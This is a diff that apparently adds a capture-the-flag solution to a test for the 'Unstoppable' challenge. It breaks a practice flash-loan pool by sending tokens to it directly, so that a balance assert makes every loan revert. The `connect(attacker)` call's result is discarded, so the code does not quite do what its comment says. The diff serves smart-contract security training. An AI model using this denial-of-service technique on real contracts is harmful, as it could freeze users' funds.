@@ -39,7 +39,15 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+
+        // switch to attacker address as signer for token contract
+        await this.token.connect(attacker);
+
+        /* flash loan function always reverts when assert(poolBalance == balanceBefore) throws an error
+           increasing the pool token balance w/o calling depositTokens() leads to poolBalance < balanceBefore in all cases
+           calling the flash loan function will then always revert
+        */
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
